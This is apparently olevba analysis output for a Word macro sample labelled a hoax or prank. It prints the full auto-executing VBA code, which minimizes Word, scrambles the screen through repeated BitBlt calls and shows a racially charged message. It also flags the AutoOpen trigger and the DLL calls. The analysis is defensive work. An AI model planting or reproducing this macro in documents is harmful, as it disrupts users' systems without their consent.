olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Hoax.MSWord.BadJoke.Zelda
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Hoax.MSWord.BadJoke.Zelda - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Zelda.bas 
in file: Hoax.MSWord.BadJoke.Zelda - OLE stream: 'Macros/VBA/Zelda'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, ByVal x As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal XSrc As Long, ByVal YSrc As Long, ByVal dwRop As Long) As Long

Sub AutoOpen()
On Error Resume Next
Application.WindowState = wdWindowStateMinimize
Randomize
For graf = 1 To 110000
Randomize
c = GetDC(0)
x = Int(Rnd * 600) + 1
Y = Int(Rnd * 800) + 1
X1 = x + 1
Y1 = Y + 1
c = BitBlt(c, Y1, X1, 6, 6, c, Y, x, -3)
Next graf
MsgBox "Feel the white power...", vbInformation, "Win32/VBS.Angeldust"
End Sub
Sub helpabout()
On Error Resume Next
Randomize
dc = GetDC(0)
Blt = BitBlt(dc, 0, 0, 1024, 768, dc, 0, 0, &H550009)
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Lib                 |May run code from a DLL                      |
+----------+--------------------+---------------------------------------------+

